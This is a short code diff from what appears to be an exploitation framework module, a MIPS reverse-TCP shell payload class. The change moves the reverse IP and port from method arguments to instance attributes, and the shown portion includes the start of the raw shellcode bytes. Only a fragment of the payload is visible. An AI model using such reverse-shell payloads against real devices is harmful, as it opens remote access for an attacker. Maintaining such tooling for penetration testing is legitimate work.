@@ -19,9 +19,9 @@ class Exploit(payloads.Payload):
     target = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
     port = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
 
-    def generate(self, target, port):
-        reverse_ip = self.convert_ip(target)
-        reverse_port = self.convert_port(port)
+    def generate(self):
+        reverse_ip = self.convert_ip(self.target)
+        reverse_port = self.convert_port(self.port)
 
         self.payload = (
             "\x28\x04\xff\xff" +            # slti     a0,zero,-1
